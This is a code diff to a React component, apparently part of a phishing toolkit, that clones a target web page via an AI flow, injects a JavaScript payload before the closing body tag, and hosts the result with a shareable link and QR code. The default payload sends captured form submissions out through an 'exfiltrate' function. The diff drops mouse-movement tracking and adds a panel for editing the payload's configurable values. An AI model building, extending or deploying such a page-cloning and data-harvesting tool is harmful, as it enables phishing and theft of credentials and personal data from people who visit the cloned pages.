@@ -6,19 +6,20 @@ import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import Link from 'next/link';
-import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
+import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Textarea } from '@/components/ui/textarea';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
+import { Loader2, Wand, Share2, Clipboard, Globe, Settings } from 'lucide-react';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import { Label } from '@/components/ui/label';
 import { QrCodeGenerator } from './qr-code-generator';
 import type { JsPayload } from './javascript-library';
+import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from './ui/accordion';
 
 const formSchema = z.object({
   targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
@@ -65,15 +66,6 @@ const defaultJsPayload = `
         });
     }, true);
 
-    // --- Mouse Movement ---
-    let lastMove = 0;
-    document.addEventListener('mousemove', (e) => {
-        if (Date.now() - lastMove > 200) { // Throttle logging
-            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
-            lastMove = Date.now();
-        }
-    });
-
     // --- Form Submissions ---
     document.addEventListener('submit', (e) => {
         const formData = new FormData(e.target);
@@ -97,6 +89,7 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
   const [hostedUrl, setHostedUrl] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
+  const [dynamicParams, setDynamicParams] = useState<Record<string, string>>({});
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
@@ -106,12 +99,37 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
     },
   });
 
+  const parseAndSetDynamicParams = (code: string) => {
+    const regex = /const\s+([a-zA-Z0-9_]+)\s*=\s*(['"`])(.*?)\2;/g;
+    let match;
+    const params: Record<string, string> = {};
+    while ((match = regex.exec(code)) !== null) {
+      params[match[1]] = match[3];
+    }
+    setDynamicParams(params);
+  };
+  
   useEffect(() => {
     if (selectedPayload) {
       form.setValue('jsPayload', selectedPayload.code);
+      parseAndSetDynamicParams(selectedPayload.code);
       toast({ title: "Payload Loaded", description: `"${selectedPayload.name}" has been loaded into the payload field.`});
     }
   }, [selectedPayload, form, toast]);
+
+  const handleParamChange = (key: string, value: string) => {
+    setDynamicParams(prev => ({...prev, [key]: value}));
+  };
+
+  const getModifiedPayload = () => {
+    let code = form.getValues('jsPayload');
+    Object.entries(dynamicParams).forEach(([key, value]) => {
+      const regex = new RegExp(`(const\\s+${key}\\s*=\\s*['"\`])(.*?)(['"\`];)`);
+      code = code.replace(regex, `$1${value}$3`);
+    });
+    return code;
+  };
+
 
   const processAndInject = async (values: z.infer<typeof formSchema>) => {
     setIsLoading(true);
@@ -123,7 +141,8 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
       const response = await clonePageFromUrl({ url: values.targetUrl });
       let html = response.htmlContent;
       
-      const scriptToInject = `<script>${values.jsPayload}</script>`;
+      const payloadToInject = getModifiedPayload();
+      const scriptToInject = `<script>${payloadToInject}</script>`;
       
       if (html.includes('</body>')) {
           html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
@@ -210,6 +229,24 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
                     </FormItem>
                 )}
                 />
+
+                {Object.keys(dynamicParams).length > 0 && (
+                   <Accordion type="single" collapsible>
+                        <AccordionItem value="item-1">
+                            <AccordionTrigger><Settings className="mr-2 h-4 w-4"/>Customize Payload</AccordionTrigger>
+                            <AccordionContent className="space-y-4 pt-4">
+                                {Object.entries(dynamicParams).map(([key, value]) => (
+                                    <div key={key} className="space-y-1">
+                                        <Label htmlFor={`param-${key}`} className="font-mono text-xs">{key}</Label>
+                                        <Input id={`param-${key}`} value={value} onChange={(e) => handleParamChange(key, e.target.value)} />
+                                    </div>
+                                ))}
+                            </AccordionContent>
+                        </AccordionItem>
+                    </Accordion>
+                )}
+
+
                 <div className="flex flex-col sm:flex-row gap-2">
                     <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
                         {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
